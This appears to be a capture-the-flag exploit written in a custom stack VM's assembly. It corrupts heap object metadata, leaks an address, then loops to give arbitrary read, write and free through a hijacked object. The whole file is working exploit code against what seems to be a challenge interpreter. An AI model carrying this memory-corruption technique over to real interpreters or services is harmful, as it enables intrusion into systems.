/* Allocate 0~6 */
push 16
galloc
push 16
galloc
push 16
galloc
push 16
galloc
push 16
galloc
push 16
galloc
push 16
galloc

add; pop; pop; pop; pop
/* Set 6 to point to the data area of 5 */
push 0x20
push 0
sub
add
/* Leak the address of 5 */
pop
printint

/* Set up our living area - 4 qwords is enough */
pop
pop
pop
pop

push 0
push 10
dumpstack
pop

rwloop:
  /* Overwrite object 6 */
  push 5; gread
  /* Read config */
  push 4; gread
  push 0; push 4; gget; push 0; eq; jnz op0;
  push 0; push 4; gget; push 1; eq; jnz op1;
  push 0; push 4; gget; push 2; eq; jnz op2;
  push 0; push 4; gget; push 3; eq; jnz op3;

op0:
  jmp op0
op1:
  push 6; gwrite
  jmp rwloop
op2:
  push 6; gread
  jmp rwloop
op3:
  push 6; gfree

halt
